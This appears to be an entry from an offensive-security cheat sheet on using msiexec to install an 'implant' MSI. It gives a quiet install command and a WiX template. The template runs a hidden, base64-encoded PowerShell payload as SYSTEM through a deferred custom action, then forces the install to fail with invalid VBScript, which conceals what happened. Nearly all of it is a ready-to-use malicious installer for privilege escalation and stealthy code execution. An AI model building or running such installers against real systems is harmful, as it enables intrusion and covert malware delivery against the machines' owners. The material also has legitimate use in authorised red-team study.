# MSI

## Msiexec

```
C:\> msiexec /quiet /qn /i implant.msi "C:\path\to\implant.msi"
```

```xml
<?xml version="1.0"?>
<Wix xmlns="http://wixtoolset.org/schemas/v4/wxs">
 <Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
  <Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
  <Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>

  <Directory Id="TARGETDIR" Name="SourceDir">
   <Directory Id="ProgramFilesFolder">
    <Directory Id="INSTALLLOCATION" Name="Example">
     <Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
      <File Id="ApplicationFile1" Source="Updater.exe"/>
     </Component>
    </Directory>
   </Directory>
  </Directory>

  <Feature Id="DefaultFeature" Level="1">
   <ComponentRef Id="ApplicationFiles"/>
  </Feature>

  <Property Id="cmdline">powershell.exe -nop -w hidden -e <base64_payload>
  </Property>

  <CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/>
  <CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check">
   invalid vbs to fail install
  </CustomAction>

  <InstallExecuteSequence>
   <Custom Action="SystemShell" After="InstallInitialize"></Custom>
   <Custom Action="FailInstall" Before="InstallFiles"></Custom>
  </InstallExecuteSequence>

 </Product>
</Wix>
```

---
## References

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)